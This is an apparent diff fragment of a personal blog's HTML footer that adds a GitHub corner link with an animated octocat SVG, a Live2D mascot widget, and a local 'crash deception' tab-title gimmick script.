+<a href="https://mamor5409.github.io/" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#64CEAA; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"rect":"opacity:0.7","log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+
+
+<!--崩溃欺骗-->
+<script type="text/javascript" src="/js/src/crash_cheat.js"></script>
+
+</html>
+
